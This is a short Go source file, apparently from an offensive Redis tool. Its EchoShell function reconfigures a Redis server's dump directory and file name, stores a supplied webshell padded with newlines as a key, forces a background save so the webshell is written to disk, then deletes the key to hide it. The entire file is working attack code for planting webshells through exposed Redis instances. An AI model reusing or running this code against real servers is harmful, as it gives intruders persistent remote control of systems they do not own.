package pkg

import (
	"context"
	"fmt"
	"os"
	"strings"
	"time"
)

func EchoShell(dir, dbfilename, webshell string) {

	dir = fmt.Sprintf("config set dir %v", dir)
	dbfilename = fmt.Sprintf("config set dbfilename %v", dbfilename)
	webshell = fmt.Sprintf("\n\n\n\n\n%v\n\n\n\n", webshell)

	RunRedisCmd(dir)
	RunRedisCmd(dbfilename)

	ctx := context.Background()
	ok, err := Rdb.Set(ctx, "webshell", webshell, time.Minute*2).Result()

	if err != nil {
		fmt.Println(err)
		return
	}

	fmt.Printf("[%v]\t%v\n", ok, "set webshell "+strings.ReplaceAll(webshell, "\n", ""))
	RunRedisCmd("bgsave")
	RunRedisCmd("del webshell")

}

func RunRedisCmd(cmd string) {
	res, err := RedisCmd(cmd)

	if err != nil {
		fmt.Printf("[%v]\t%v\n", GbkToUtf8(err.Error()), cmd)
		os.Exit(0)
	}
	fmt.Printf("[%v]\t%v\n", res, GbkToUtf8(cmd))
}
